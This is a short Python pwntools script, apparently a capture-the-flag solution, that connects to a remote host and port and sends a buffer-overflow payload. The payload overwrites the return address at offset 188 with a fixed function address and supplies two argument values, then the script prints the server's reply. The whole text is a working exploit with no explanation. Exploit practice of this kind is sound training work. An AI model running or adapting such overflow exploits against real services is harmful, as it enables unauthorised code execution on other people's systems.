from pwn import *

#io = process('./vuln')
io = remote('139.59.168.125',31740)
offset = 188
payload = flat({
    offset: [
        0x80491e2,
        0x0,  
        0xdeadbeef,  
        0xc0ded00d,  
    ]
})

write('payload', payload)
io.sendlineafter(b':', payload)
print(io.recvall().decode('latin-1'))
